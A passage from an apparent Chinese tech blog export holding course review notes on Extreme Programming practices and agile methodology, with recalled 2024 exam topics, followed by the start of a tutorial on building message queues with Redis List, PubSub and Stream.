<li>生产力的提高来自于减少调试所花费的时间。</li>
</ul>
</li>
</ul>
<h4 id="什么类型的测试？"><a href="#什么类型的测试？" class="headerlink" title="什么类型的测试？"></a>什么类型的测试？</h4><ul>
<li>我们将有程序员编写的单元测试，以说服他们自己的程序按照他们认为的方式工作。</li>
<li>我们还将有客户编写（或至少由客户指定）的功能测试，以说服他们整个系统按照他们认为整个系统应该的方式工作。</li>
</ul>
<h3 id="倾听"><a href="#倾听" class="headerlink" title="倾听"></a>倾听</h3><ul>
<li>程序员向业务人员请教以获得项目的业务视角。</li>
<li>程序员帮助业务人员了解软件中什么是容易的，什么是困难的。</li>
<li>相互倾听（程序员之间、程序员与客户之间）</li>
</ul>
<h3 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h3><ul>
<li>仅仅倾听、编写测试用例、使其运行、再倾听、编写测试用例、使其运行是不够的吗？不是的</li>
<li>唯一使下一个测试用例运行的方法是破坏另一个。</li>
<li>或者唯一使测试用例运行的方法是远比值得的麻烦。</li>
<li>良好的设计：<ul>
<li>良好的设计将逻辑组织起来，使得对系统一个部分的更改不总是需要对系统的另一个部分进行更改。</li>
<li>良好的设计确保系统中的每一段逻辑都有且只有一个归属地。</li>
<li>良好的设计将逻辑放在它操作的数据附近。</li>
<li>良好的设计允许通过仅在一个地方进行更改来扩展系统。</li>
</ul>
</li>
</ul>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul>
<li>因此，你编码是因为如果你不编码，你什么也没做。</li>
<li>你测试是因为如果你不测试，你就不知道何时完成了编码。</li>
<li>你倾听是因为如果你不倾听，你就不知道要编码或测试什么。</li>
<li>你设计是为了能够无限期地继续编码、测试和倾听。</li>
</ul>
<h2 id="极限编程实践"><a href="#极限编程实践" class="headerlink" title="极限编程实践"></a>极限编程实践</h2><h3 id="计划游戏"><a href="#计划游戏" class="headerlink" title="计划游戏"></a>计划游戏</h3><ul>
<li>商业考虑和技术考虑都不应占据主导地位。</li>
<li>软件开发始终是可能与理想之间不断演变的对话。</li>
<li>商业不能在真空中做出这些决定。开发需要做出技术决策，为商业决策提供原材料。</li>
</ul>
<table>
<thead>
<tr>
<th align="left">商业人员决定</th>
<th align="left">技术人员决定</th>
</tr>
</thead>
<tbody><tr>
<td align="left">范围：为使系统在生产中具有价值，必须解决多少问题？优先级：如果最初只能选择A或B，你想要哪一个？发布的组成：在软件比没有软件更好之前，需要做多少或做多少？发布的日期：哪些重要日期软件（或部分软件）的存在会带来很大不同？</td>
<td align="left">估算：实现一个功能需要多长时间？后果：有些战略性的商业决策只有在了解技术后果后才能做出。过程：工作和团队将如何组织？详细计划：在一个发布中，哪些故事将首先完成？</td>
</tr>
</tbody></table>
<h3 id="小规模发布"><a href="#小规模发布" class="headerlink" title="小规模发布"></a>小规模发布</h3><ul>
<li>每次发布都应该尽可能小，包含最有价值的业务需求。</li>
<li>发布作为一个整体必须有意义。</li>
<li>计划一个月或两个月的时间要比计划六个月或一年的时间要好得多。</li>
</ul>
<h3 id="隐喻"><a href="#隐喻" class="headerlink" title="隐喻"></a>隐喻</h3><ul>
<li>每个XP软件项目都由一个单一的总体隐喻指导。</li>
<li>XP中的隐喻取代了其他人所说的“架构”的大部分内容。</li>
<li>架构并不一定使系统具有任何意义上的内聚性。</li>
<li>选择一个系统隐喻，通过一致地命名类和方法来保持团队在同一页面上。</li>
<li>例如，克莱斯勒的工资系统是作为生产线构建的。在另一家汽车制造商中，汽车销售被构建为材料清单。</li>
<li>搜索引擎是一大群蜘蛛，在网上四处寻找要捕捉的东西，然后把东西带回巢穴。</li>
</ul>
<h3 id="简单设计"><a href="#简单设计" class="headerlink" title="简单设计"></a>简单设计</h3><ol>
<li>运行所有测试。</li>
<li>没有重复的逻辑。警惕隐藏的重复，如平行类层次结构。</li>
<li>表达程序员认为重要的每一个意图。</li>
<li>拥有尽可能少的类和方法。</li>
</ol>
<p>反对：“为今天实现，为明天设计。”</p>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><ul>
<li>没有自动化测试的任何程序功能实际上都不存在。</li>
<li>程序员编写单元测试，以便他们对程序运行的信心可以成为程序本身的一部分。</li>
<li>客户编写功能测试，以便他们对程序运行的信心也可以成为程序的一部分。</li>
</ul>
<h3 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h3><ul>
<li>在实现程序功能时，程序员总是会问是否有办法改变现有程序，使添加功能变得简单。</li>
<li>你不会基于猜测进行重构；当系统要求你这样做时，你才会进行重构。<ul>
<li>当系统要求你复制代码时，它就是在要求重构。</li>
</ul>
</li>
</ul>
<h3 id="结对编程"><a href="#结对编程" class="headerlink" title="结对编程"></a>结对编程</h3><p>所有生产代码都是由两个人看着一台机器编写的，使用一个键盘和一个鼠标。</p>
<ul>
<li>一个伙伴，拥有键盘和鼠标的人，正在思考如何最好地实现这个方法。</li>
<li>另一个伙伴则更具战略性地思考：<ul>
<li>这种整体方法会起作用吗？</li>
<li>还有哪些测试用例可能还没有通过？</li>
<li>是否有办法简化整个系统，使当前问题消失？</li>
</ul>
</li>
<li>如果两个人在早上结对，下午他们可能很容易与其他同事结对。</li>
<li>如果你负责一个你不熟悉的领域的任务，你可能会请最近有经验的人与你结对。</li>
</ul>
<h3 id="集体所有权"><a href="#集体所有权" class="headerlink" title="集体所有权"></a>集体所有权</h3><p>任何看到有机会为代码任何部分增加价值的人都被要求随时这样做。</p>
<ul>
<li>没有所有权：在过去，没有人拥有任何特定的代码部分。如果有人想更改一些代码，他们会根据自己的目的进行更改，不管它是否与已有的代码很好地结合。</li>
<li>个人代码所有权：只有代码的官方所有者才能更改代码的一部分。任何其他看到代码需要更改的人都必须向所有者提交请求。人们不愿打扰代码所有者。</li>
</ul>
<h3 id="持续集成-1"><a href="#持续集成-1" class="headerlink" title="持续集成"></a>持续集成</h3><ul>
<li>代码在几小时后集成和测试——最多一天的开发。</li>
<li>一种简单的方法是专门有一台机器用于集成。</li>
<li>当机器空闲时，有代码要集成的结对会坐下来，加载当前版本，加载他们的更改（检查并解决任何冲突），并运行测试直到通过（100%正确）。</li>
<li>一次集成一组更改效果很好，因为谁应该修复失败的测试显而易见——应该是我们，因为我们肯定破坏了它，因为上一对离开时测试是100%。</li>
</ul>
<h3 id="40小时工作制"><a href="#40小时工作制" class="headerlink" title="40小时工作制"></a>40小时工作制</h3><ul>
<li>加班是项目上严重问题的症状。</li>
<li>是否将其转化为每周在工作场所正好40小时并不太重要。</li>
</ul>
<h3 id="现场客户"><a href="#现场客户" class="headerlink" title="现场客户"></a>现场客户</h3><ul>
<li>真正的客户必须与团队坐在一起，随时回答问题，解决争端，并设定小规模优先级。</li>
<li>对此规则的主要反对意见是，正在开发的系统的真正用户太有价值，不能交给团队。<ul>
<li>管理者将不得不决定哪个更有价值——让软件更早、更好地工作，还是拥有一个人或两个人的输出。</li>
</ul>
</li>
</ul>
<h3 id="编码标准"><a href="#编码标准" class="headerlink" title="编码标准"></a>编码标准</h3><p>如果你将让所有这些程序员从系统的一个部分换到另一个部分，每天换几次伙伴，并不断重构彼此的代码，你根本无法负担拥有不同的编码实践。</p>
<h2 id="这样如何能行？"><a href="#这样如何能行？" class="headerlink" title="这样如何能行？"></a>这样如何能行？</h2><p>这些实践相互支持。一个实践的弱点被其他实践的优势所弥补。</p>
<h3 id="本章如何组织？"><a href="#本章如何组织？" class="headerlink" title="本章如何组织？"></a>本章如何组织？</h3><ul>
<li>上述实践没有一个是独特或原创的。</li>
<li>它们自编写程序以来就已经被使用。</li>
<li>大多数这些实践由于其弱点变得明显而被更复杂、开销更高的实践所取代。</li>
<li>如果这些弱点现在被其他实践的优势所弥补会怎样？</li>
</ul>
<h3 id="计划游戏-1"><a href="#计划游戏-1" class="headerlink" title="计划游戏"></a>计划游戏</h3><ul>
<li>你不可能仅凭一个粗略的计划就开始开发。</li>
<li>你不能不断更新计划——那会花费太多时间并让客户不安。<ul>
<li>客户根据程序员提供的估算自己更新计划。</li>
<li>你一开始有足够的计划，让客户对接下来几年可能实现的内容有一个大致的了解。</li>
</ul>
</li>
<li>你进行短周期发布，因此计划中的任何错误最多只会影响几周或几个月。</li>
<li>你的客户与团队坐在一起，因此他们可以迅速发现潜在的变化和改进机会。</li>
</ul>
<h3 id="短周期发布"><a href="#短周期发布" class="headerlink" title="短周期发布"></a>短周期发布</h3><ul>
<li>你不可能在几个月后就投入生产。<ul>
<li>计划游戏帮助你专注于最有价值的故事，因此即使是小型系统也具有商业价值。</li>
<li>你持续集成，因此打包发布成本很小。</li>
</ul>
</li>
<li>你的测试将缺陷率降低到足够低，因此你不需要在允许软件发布之前进行漫长的测试周期。</li>
<li>你可以进行简单的设计，足以应对此次发布，而不是永远。</li>
</ul>
<h3 id="隐喻-1"><a href="#隐喻-1" class="headerlink" title="隐喻"></a>隐喻</h3><p>你不可能仅凭一个隐喻就开始开发。那里没有足够的细节，而且，如果你错了怎么办？</p>
<ul>
<li>你很快就能从实际代码和测试中获得关于隐喻是否在实践中有效的具体反馈。</li>
<li>你的客户能够用隐喻来谈论系统。</li>
<li>你通过重构不断细化对隐喻在实践中意义的理解。</li>
</ul>
<h3 id="简单设计-1"><a href="#简单设计-1" class="headerlink" title="简单设计"></a>简单设计</h3><p>你不可能仅凭今天的代码就拥有足够的设计。你会将自己设计到一个死胡同，然后你将无法继续系统的发展。</p>
<ul>
<li>你习惯于重构，因此进行更改不是问题。</li>
</ul>
<h4 id="简单设计-2"><a href="#简单设计-2" class="headerlink" title="简单设计"></a>简单设计</h4><ul>
<li>你有一个清晰的总体隐喻，因此你确信未来的更改会沿着一个收敛的方向发展。</li>
<li>你与伙伴一起编程，因此你有信心你正在做出一个简单的设计，而不是愚蠢的设计。</li>
</ul>
<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>你不可能编写所有这些测试。那会花费太多时间。程序员不会编写测试。</p>
<ul>
<li>设计尽可能简单，因此编写测试并不那么困难。</li>
<li>结对编程——伙伴的压力</li>
<li>当你看到所有测试都在运行时，你会感觉很好。</li>
<li>当客户看到他们所有的测试都在运行时，他们会感觉系统很好。</li>
</ul>
<h3 id="重构-1"><a href="#重构-1" class="headerlink" title="重构"></a>重构</h3><ul>
<li>你不可能一直重构系统的设计。这会花费太长时间，难以控制，而且很可能破坏系统。<ul>
<li>你习惯于集体所有制，所以你不在意在需要的地方进行更改。</li>
<li>你有编码标准，所以在重构之前不需要重新格式化。</li>
</ul>
</li>
<li>你成对编程，因此你更有可能有勇气进行艰难的重构，而且你不太可能破坏东西。</li>
<li>你有简单的结构，因此重构更容易。</li>
<li>你有测试，因此你不太可能在不知情的情况下破坏东西。</li>
<li>你持续集成，因此如果你不小心破坏了远处的东西，或者你的重构与他人的工作冲突，你将在几小时内知道。</li>
<li>你休息得很好，因此你更有勇气，也更不可能犯错。</li>
</ul>
<h3 id="结对编程-1"><a href="#结对编程-1" class="headerlink" title="结对编程"></a>结对编程</h3><ul>
<li>你不可能成对编写所有生产代码。那会太慢。如果两个人不和怎么办？<ul>
<li>编码标准减少了琐碎的争吵。</li>
<li>每个人都休息得很好，进一步减少了无利可图的……呃……讨论的机会。</li>
</ul>
</li>
<li>结对编写测试，让他们在着手实现核心内容之前有机会对理解进行对齐。</li>
<li>结对有隐喻来指导他们关于命名和基本设计的决策。</li>
<li>结对在简单的结构中工作，因此他们都能理解发生了什么。</li>
</ul>
<h3 id="集体所有权-1"><a href="#集体所有权-1" class="headerlink" title="集体所有权"></a>集体所有权</h3><ul>
<li>你不可能让每个人都有可能更改任何地方的东西。人们会到处破坏东西，集成的成本会大幅上升。<ul>
<li>你在足够短的时间内集成，因此冲突的机会减少。</li>
</ul>
</li>
<li>你编写并运行测试，因此意外破坏东西的机会减少。</li>
<li>你成对编程，因此你不太可能破坏代码，程序员更快地了解他们可以有利地更改的内容。</li>
<li>你遵循编码标准，因此你不会陷入可怕的花括号大战。</li>
</ul>
<h3 id="持续集成-2"><a href="#持续集成-2" class="headerlink" title="持续集成"></a>持续集成</h3><ul>
<li>你不可能在仅工作几小时后就进行集成。集成花费的时间太长，冲突太多，破坏东西的机会也太多。</li>
<li>你可以快速运行测试，因此你知道你没有破坏任何东西。</li>
<li>你成对编程，因此需要集成的更改流减少了一半。</li>
<li>你重构，因此有更多的小块，减少了冲突的机会。</li>
</ul>
<h3 id="40小时工作制-1"><a href="#40小时工作制-1" class="headerlink" title="40小时工作制"></a>40小时工作制</h3><p>你不可能每周工作40小时。</p>
<ul>
<li>计划游戏为你提供了更有价值的工作。</li>
<li>计划游戏和测试的结合减少了你比预期有更多的事情要做的糟糕惊喜的频率。</li>
<li>整体实践帮助你以最快速度编程，因此你无法更快。</li>
</ul>
<h3 id="现场客户-1"><a href="#现场客户-1" class="headerlink" title="现场客户"></a>现场客户</h3><p>你不可能让真正的客户全职坐在团队中。他们可以在其他地方为业务创造更多的价值。</p>
<ul>
<li>他们可以通过编写功能测试为项目创造价值。</li>
<li>他们可以通过为程序员做出小规模的优先级和范围决策为项目创造价值。</li>
</ul>
<h3 id="编码标准-1"><a href="#编码标准-1" class="headerlink" title="编码标准"></a>编码标准</h3><p>你不可能要求团队按照共同的标准编码。程序员非常个人主义，宁愿辞职也不愿将花括号放在其他地方。</p>
<ul>
<li>整个XP让他们更有可能成为获胜团队的一员。</li>
</ul>
<h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106145748115.png" alt="img"></p>
<h2 id="测试策略"><a href="#测试策略" class="headerlink" title="测试策略"></a>测试策略</h2><p>我们将在编码之前编写测试，每分钟都进行。我们将永久保留这些测试，并经常一起运行它们。我们还将从客户的角度推导出测试。</p>
<h3 id="独立且自动"><a href="#独立且自动" class="headerlink" title="独立且自动"></a>独立且自动</h3><ul>
<li>首先，每个测试不与其他你编写的测试交互。</li>
<li>测试也是自动的。</li>
<li>当压力水平上升，当人们工作过度，当人类判断开始失效时，测试最有价值。因此，测试必须是自动的——给出一个明确的系统是否按预期运行的指示。</li>
</ul>
<h3 id="无法绝对测试一切"><a href="#无法绝对测试一切" class="headerlink" title="无法绝对测试一切"></a>无法绝对测试一切</h3><ul>
<li>你应该测试可能会出错的事情。</li>
<li>测试是一种赌博。</li>
<li>测试可以通过的一种方式是当你没有预料到会成功的测试却成功了。</li>
<li>你只会编写那些能够带来回报的测试。</li>
</ul>
<h3 id="谁编写测试？——程序员"><a href="#谁编写测试？——程序员" class="headerlink" title="谁编写测试？——程序员"></a>谁编写测试？——程序员</h3><ul>
<li>如果方法的接口有任何不清晰之处，你在编写方法之前编写测试。</li>
<li>如果接口清晰，但你认为实现会有一点复杂，你在编写方法之前编写测试。</li>
<li>如果你想到了代码应该按预期工作的一个不寻常的情况，你编写一个测试来传达这种情况。</li>
<li>如果你后来发现一个问题，你编写一个测试来隔离这个问题。</li>
<li>如果你即将重构一些代码，并且你不确定它应该如何表现，并且没有针对所讨论的行为方面的测试，你先编写测试。</li>
</ul>
<p><strong>程序员测试：</strong></p>
<ul>
<li>程序员逐方法编写测试。</li>
<li>程序员编写的单元测试始终运行在100%。</li>
<li>因为程序员控制单元测试的编写和执行，他们可以保持测试完全同步。</li>
</ul>
<h3 id="谁编写测试？——客户"><a href="#谁编写测试？——客户" class="headerlink" title="谁编写测试？——客户"></a>谁编写测试？——客户</h3><ul>
<li>客户逐故事编写测试。</li>
<li>他们需要问自己的问题是，“在我对这个故事完成有信心之前，需要检查什么？”他们想到的每个场景都会变成一个测试，在这种情况下是一个功能测试。</li>
</ul>
<p><strong>客户测试：</strong></p>
<ul>
<li>功能测试不一定始终运行在100%。</li>
<li>客户通常不能自己编写功能测试。</li>
<li>这就是为什么任何规模的XP团队至少需要一名专职测试人员。</li>
</ul>
<h3 id="其他测试"><a href="#其他测试" class="headerlink" title="其他测试"></a>其他测试</h3><ul>
<li>平行测试——旨在证明新系统与旧系统完全相同的一种测试。</li>
<li>压力测试——旨在模拟最糟糕的负载的一种测试。压力测试适用于性能特性不易预测的复杂系统。</li>
<li>猴子测试——旨在确保系统在面对无意义输入时表现得合理的一种测试。</li>
</ul>
<h2 id="设计已死"><a href="#设计已死" class="headerlink" title="设计已死"></a>设计已死</h2><h3 id="设计已死？"><a href="#设计已死？" class="headerlink" title="设计已死？"></a><strong>设计已死？</strong></h3><p>初学者在接触极限编程（XP）时，可能认为XP宣告了传统设计的死亡。XP轻视“冗余的前期设计”（BigUpFrontDesign），如UML、灵活框架和模式。</p>
<p>实际上，XP并非否定设计，而是提倡演进式设计（EvolutionaryDesign），强调通过代码开发过程中的重构和持续集成来保持设计的简洁。</p>
<h3 id="演进式设计"><a href="#演进式设计" class="headerlink" title="演进式设计"></a>演进式设计</h3><p>它的本质是系统的设计随着软件开发的过程增长。设计(design)是撰写程序代码过程的一部份，随着程序代码的发展，设计也跟着调整。</p>
<p>在常见的使用中，演进式设计实在是彻底的失败。设计的结果其实是一堆为了某些特殊条件而巧妙安排的决定所组成，每个条件都会让程序代码更难修改。</p>
<p>所谓的设计(design)是要能够让你可以长期很简单地修改软件。当设计(design)不如预期时，你应该能够做有效的更改。一段时间之后，设计变得越来越糟，你也体会到这个软件混乱的程度。</p>
<h3 id="计划式设计"><a href="#计划式设计" class="headerlink" title="计划式设计"></a>计划式设计</h3><p>PlannedDesign的做法正好相反（借鉴其它工程学科）。</p>
<p>在设计图中确定所有的细节，一部份使用数学分析，但是大部分都是使用建筑规范。所谓的建筑规范就是根据成功的经验(有些是数学分析)制定出如何设计结构体的法则。当设计图完成，她们公司就可以将设计图交给另一个施工的公司按图施工。</p>
<p>PlannedDesign将同样的方式应用在软件开发。</p>
<p>Designer先定出重要的部份，程序代码不是由他们来撰写，因为软件并不是他们”建造”的，他们只负责设计。所以designer可以利用像UML这样的技术，不需要太注重撰写程序代码的细节问题，而在一个比较属于抽象的层次上工作。一旦设计的部份完成了，他们就可以将它交给另一个团队(或甚至是另一家公司)去”建造”。因为designer朝着大方向思考，所以他们能够避免因为策略方面不断的更改而导致软件的失序。Programmer就可以依循设计好的方向(如果有遵循设计)写出好的系统。</p>
<p><strong>优势</strong>：适用于结构稳定、需求明确的项目。</p>
<p>**缺点：**难以预见所有问题，后期修改成本高。开发者和设计者分离，容易导致脱节，特别是设计者对技术工具和实际需求逐渐不熟悉。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>设计的目的是让代码更易于长期修改和维护。XP强调通过代码体现设计意图，而不是依赖过多的蓝图或文档。UML和模式（Patterns）在XP中仍然有价值，但需简化使用，仅在必要时引入。</p>
<p>**设计已死？**设计并未真正消失，而是随着敏捷方法的普及，其形式和实现方式发生了改变：追求简单设计，注重重构和渐进式优化。强调设计的实用性而非理论化或过度复杂化。</p>
<p><strong>总结与建议</strong>：设计应与代码开发结合，而非分离。注重学习和掌握设计模式，同时避免滥用。架构设计需要灵活，应接受修改的可能性。简单设计是XP的基础，但实现简单设计需要持续努力和技巧。</p>
<h1 id="新方法学"><a href="#新方法学" class="headerlink" title="新方法学"></a>新方法学</h1><h2 id="敏捷方法"><a href="#敏捷方法" class="headerlink" title="敏捷方法"></a>敏捷方法</h2><p>敏捷方法（agilemethodologies）的发展是对这些工程方法的反弹。对许多人来说，这类方法的吸引之处在于对繁文缛节的官僚过程的反叛。它们在无过程和过于繁琐的过程中达到了一种平衡，使得能以不多的步骤过程获取较满意的结果。</p>
<h3 id="表面区别"><a href="#表面区别" class="headerlink" title="表面区别"></a>表面区别</h3><p>敏捷型与工程型方法有一些显著的区别。其中一个显而易见的不同反映在文档上。敏捷型不是很面向文档，对于一项任务，它们通常只要求尽可能少的文档。从许多方面来看，它们更象是“面向源码”（code-oriented）。事实上，最根本的文档应该是源码。</p>
<h3 id="本质区别"><a href="#本质区别" class="headerlink" title="本质区别"></a>本质区别</h3><p>文档方面的特点不是敏捷型方法的根本特征。文档减少仅仅是个表象，它其实反映的是两个更深层的特点：</p>
<ul>
<li>敏捷型方法是**“适应性”而非“预见性”**。工程方法试图对一个软件开发项目在很长的时间跨度内作出详细的计划，然后依计划进行开发。这类方法在一般情况下工作良好，但（需求、环境等）有变化时就不太灵了。因此它们本质上是拒绝变化的。而敏捷型方法则欢迎变化。其实，它们的目的就是成为适应变化的过程，甚至能允许改变自身来适应变化。</li>
<li>敏捷型方法是**“面向人”的（people-oriented）而非“面向过程”的（process-oriented）**。工程型方法的目标是定义一个过程，不管是谁用都工作。而敏捷型方法则认为没有任何过程能代替开发人员的技能，过程起的作用是对开发人员的工作提供支持。</li>
</ul>
<h2 id="不可预见性"><a href="#不可预见性" class="headerlink" title="不可预见性"></a>不可预见性</h2><h3 id="需求的不可预见性"><a href="#需求的不可预见性" class="headerlink" title="需求的不可预见性"></a><strong>需求的不可预见性</strong></h3><p>要准确获取所有需求是困难的，特别是当开发商不能提供某些需求的费用信息时。作软件开发的费用估算是不容易的，这有多种原因。软件的“不可触摸”性也是一个原因。商业世界的许多变化是完全不可预测的.软件开发的一切都取决于系统需求，如果需求不固定，你就不能制订出一个可预见性的计划。</p>
<h3 id="预见性是不可能的"><a href="#预见性是不可能的" class="headerlink" title="预见性是不可能的"></a><strong>预见性是不可能的</strong></h3><p>如果你不能遵循一个可预见性方法，而你强装能够，那么这是非常危险的.使用预见性方法具有强烈的诱惑力.在不可预见性的环境中是不能使用预见性方法的。它意味着我们用的许多控制项目的模式，许多处理客户关系的模式，都不会再是正确的了。一个好的预见性项目是依计划而行，而一个好的敏捷型项目会建造出一个与最初计划不太一样却是更好的软件。人是软件开发中最重要的因素。之所以强调开发人员的作用，一个重要的原因是IT行业的技术变化速度非常之快。今天的新技术可能几年后就过时了。这种情况完全不同于其他行业。</p>
<h2 id="关键问题"><a href="#关键问题" class="headerlink" title="关键问题"></a>关键问题</h2><p><strong>软件过程</strong>：设计（UML）+构造</p>
<p><strong>关键问题</strong>：1.是否有可能用UML进行设计，并将它变成代码；2.这样做的代价</p>
<p>A1：UML被用于实现时存在仍有缺陷；有经验的设计人员做UML设计，无法保证UML设计是正确的；</p>
<p>A2：civil工程经过很多年经验保证其合理正确,UML设计只能找人review,但是错误只有在编码和测试中才能发现。</p>
<p><strong>结论</strong>：软件中大部分努力是设计，需要杰出人员，创造性的过程不容易被计划，因此<strong>可预期是不可能的</strong>。</p>
<h2 id="需求变更"><a href="#需求变更" class="headerlink" title="需求变更"></a>需求变更</h2><p><strong>需求变更</strong>：需求一直在变，难以完全了解需求（文档化，客户签字）；难以确定每个需求的费用，确定哪些需求进入开发；难以估算时间，成本（设计和人难以估算，材料技术变更，难以判断需求带来的价值）；需求本质上应该可以变更（商业社会变更，无法预测）</p>
<p><strong>控制不可预期过程&#x3D;&gt;迭代式开发（优势：风险控制）</strong></p>
<p>固定价格的合同要求稳定的需求和可预期的过程，敏捷无法同时规定时间、价格、范围。敏捷通常情况下将范围控制在一种可变的情况下。公司和开发人员难以建立<strong>信任关系</strong>，因此在公司内部比较常用。</p>
<h2 id="评价项目成功"><a href="#评价项目成功" class="headerlink" title="评价项目成功"></a>评价项目成功</h2><p><strong>评价项目成功</strong>：<strong>传统</strong>：是否遵循计划，是否按时在成本约束范围内完成；<strong>敏捷</strong>：产出&gt;投入</p>
<p>管理以人为导向的过程：由开发者自己选择自适应的过程；开发者作出所有的技术决定；开发者需要与业务专家交流，开发者必须被相信</p>
<p><strong>人件</strong>:顺流,更好的工作环境有助于人们工作的更好,或那些工作的更好的人倾向与加入那些提供更好工作空间的公司.</p>
<h2 id="度量的困难性"><a href="#度量的困难性" class="headerlink" title="度量的困难性"></a><strong>度量的困难性</strong></h2><p>度量软件是非常困难的。不存在一套有效的度量方法而要在管理中引入度量将会导致管理本身出问题。传统方法假设的前提是基于度量的管理是最有效的管理方式。而敏捷开发者则认为软件开发的特性会使得基于度量的管理导致非常高度的度量“失效”。</p>
<h1 id="2024期末回忆"><a href="#2024期末回忆" class="headerlink" title="2024期末回忆"></a>2024期末回忆</h1><h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p>一半是课堂小测原题，一半新题，但是完整复习过就会，比较简单；（15题，共30分）</p>
<h2 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h2><p>前两题比较简单，后面的比较偏。</p>
<h3 id="没有银弹和本质特性（10分）"><a href="#没有银弹和本质特性（10分）" class="headerlink" title="没有银弹和本质特性（10分）"></a>没有银弹和本质特性（10分）</h3><ol>
<li>简述没有银弹的基本观点；描述软件开发的四个本质特性。</li>
</ol>
<h3 id="Linus和Brooks（10分）"><a href="#Linus和Brooks（10分）" class="headerlink" title="Linus和Brooks（10分）"></a>Linus和Brooks（10分）</h3><ol>
<li>描述Linus定理；描述Brooks定理；</li>
</ol>
<h3 id="XP实践（20分）"><a href="#XP实践（20分）" class="headerlink" title="XP实践（20分）"></a>XP实践（20分）</h3><ol>
<li>为什么只有同时进行重构、TDD、持续集成、简单设计四个实践，才能互相协作和互补？</li>
<li>如果只进行一个实践，会导致哪些问题？</li>
</ol>
<h3 id="Scrum和XP（30分）"><a href="#Scrum和XP（30分）" class="headerlink" title="Scrum和XP（30分）"></a>Scrum和XP（30分）</h3><ol>
<li>Scrum核心优势及其局限性<ul>
<li>如何通过迭代管理和团队角色分工实现项目管理？</li>
<li>Scrum方法在开发阶段对工程实践的规定不足的导致哪些问题？</li>
</ul>
</li>
<li>XP实践核心特点及其优势<ul>
<li>XP实践如何保证软件质量和开发速度？</li>
</ul>
</li>
<li>Scrum和XP实践如何在管理和技术</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><p>软件工程管理-硕（2024）课件</p>
</li>
<li><p>论语孟子整理.docx——Chipsy</p>
</li>
<li><p><a href="https://eaglebear2002.github.io/39305/#more">软件工程管理-06-极限编程|EagleBear2002的博客</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件工程管理</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>软件工程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（七）——redis消息队列</title>
    <url>/2024/02/17/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94redis%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h2 id="Redis消息队列"><a href="#Redis消息队列" class="headerlink" title="Redis消息队列"></a>Redis消息队列</h2><p>消息队列（Message Queue），存放消息的队列，最简单的模型包括3个角色：</p>
<ul>
<li>消息队列：存储和管理消息，也成为消息代理（Message Broker）</li>
<li>生产者：发送消息到消息队列</li>
<li>消费者：从消息队列获取消息并处理消息</li>
</ul>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217140004950.png" alt="image-20250217140004950" style="zoom: 67%;" />

<p>Redis提供了三种不同的方式来实现消息队列：</p>
<ul>
<li>list结构：基于List结构模拟消息队列</li>
<li>PubSub：基本的点对点消息模型</li>
<li>Stream：比较完善的消息队列模型</li>
</ul>
<h2 id="基于List结构模拟消息队列"><a href="#基于List结构模拟消息队列" class="headerlink" title="基于List结构模拟消息队列"></a>基于List结构模拟消息队列</h2><p>Redis的list结构是一个双向链表，可以模拟队列效果。不过要注意的是，当队列没有消息时，RPOP或LPOP操作 会返回null，为达到阻塞效果，应该使用BRPOP或BLPOP。</p>
<p>优点：</p>
<ul>
<li>利用Redis存储，不受限于JVM内存上限。</li>
<li>基于Redis的持久化机制，数据安全性有保证。</li>
<li>可以满足消息有序性。</li>
</ul>
<p>缺点：</p>
<ul>
<li>无法避免消息丢失。BRPOP后，如果服务宕机没有处理消息，那么消息就会丢失。</li>
<li>只支持单消费者 。</li>
</ul>
<h2 id="基于PubSub的消息队列"><a href="#基于PubSub的消息队列" class="headerlink" title="基于PubSub的消息队列"></a>基于PubSub的消息队列</h2><p>PubSub是Redis2.0版本引入的消息传递模型。消费者可以订阅一个或多个channel，生产者向对应channel发送消息后，所有订阅者都能收到相关信息。</p>
<ul>
<li>SUBSCRIBE channel [channel]：订阅一个或多个频道</li>
<li>PUBLISH channel msg：向一个频道发送消息</li>
<li>PSUBSCRIBE pattern[pattern]：订阅与pattern格式匹配的所有频道</li>
</ul>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217141845687.png" alt="image-20250217141845687" style="zoom:67%;" />

<p>优点：</p>
<ul>
<li>采用发布订阅模型，支持多生产、多消费。</li>
</ul>
<p>缺点：</p>
<ul>
<li>不支持数据持久化。</li>
<li>无法避免消息丢失。发布消息如果没人订阅，则消息丢失。</li>
<li>消息堆积有上限，超出时数据丢失。</li>
</ul>
<h2 id="基于Stream的消息队列"><a href="#基于Stream的消息队列" class="headerlink" title="基于Stream的消息队列"></a>基于Stream的消息队列</h2><h3 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h3><p>Stream是Redis5.0引入的一种新数据类型，可以实现一个功能非常完善的消息队列。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217144341048.png" alt="image-20250217144341048"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217144518353.png" alt="image-20250217144518353"></p>
<p>在业务中，可以循环的调用XREAD阻塞方式来查询最新消息，从而实现持续监听队列的效果。</p>
